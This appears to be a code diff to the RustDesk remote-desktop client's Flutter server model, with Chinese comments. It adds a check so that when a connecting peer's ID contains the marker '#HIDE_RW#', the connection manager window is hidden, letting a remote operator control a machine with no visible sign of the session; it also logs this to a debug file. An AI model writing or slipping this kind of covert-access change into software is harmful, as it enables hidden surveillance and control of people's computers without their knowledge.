@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'dart:io';
 
 import 'package:flutter/material.dart';
 import 'package:flutter_hbb/consts.dart';
@@ -555,6 +556,18 @@ class ServerModel with ChangeNotifier {
   void addConnection(Map<String, dynamic> evt) {
     try {
       final client = Client.fromJson(jsonDecode(evt["client"]));
+      
+      // 检查是否需要隐藏连接管理器窗口
+      final shouldHideCm = client.peerId.contains("#HIDE_RW#");
+      if (shouldHideCm) {
+        // 输出到调试文件
+        try {
+          File('RustDesk_debug.log').writeAsStringSync("Flutter addConnection 检测到隐藏窗口标记，隐藏连接管理器\n", mode: FileMode.append);
+        } catch (_) {}
+        // 设置隐藏标志
+        hideCm = true;
+      }
+      
       if (client.authorized) {
         parent.target?.dialogManager.dismissByTag(getLoginDialogTag(client.id));
         final index = _clients.indexWhere((c) => c.id == client.id);
@@ -571,14 +584,19 @@ class ServerModel with ChangeNotifier {
       }
       _addTab(client);
       // remove disconnected
+      // 去除隐藏标记进行比较，确保能正确匹配断开的连接
+      final cleanPeerId = client.peerId.replaceAll("#HIDE_RW#", "");
       final index_disconnected = _clients
-          .indexWhere((c) => c.disconnected && c.peerId == client.peerId);
+          .indexWhere((c) => c.disconnected && c.peerId.replaceAll("#HIDE_RW#", "") == cleanPeerId);
       if (index_disconnected >= 0) {
         _clients.removeAt(index_disconnected);
         tabController.remove(index_disconnected);
       }
       if (desktopType == DesktopType.cm && !hideCm) {
         showCmWindow();
+      } else if (desktopType == DesktopType.cm && hideCm) {
+        // 如果需要隐藏，确保窗口被隐藏
+        hideCmWindow();
       }
       scrollToBottom();
       notifyListeners();
@@ -848,9 +866,9 @@ class Client {
     // TODO: no entry then default.
     isViewCamera = json['is_view_camera'];
     isTerminal = json['is_terminal'] ?? false;
-    portForward = json['port_forward'];
-    name = json['name'];
-    peerId = json['peer_id'];
+    portForward = json['port_forward'] ?? '';
+    name = json['name'] ?? '';
+    peerId = json['peer_id'] ?? '';
     keyboard = json['keyboard'];
     clipboard = json['clipboard'];
     audio = json['audio'];
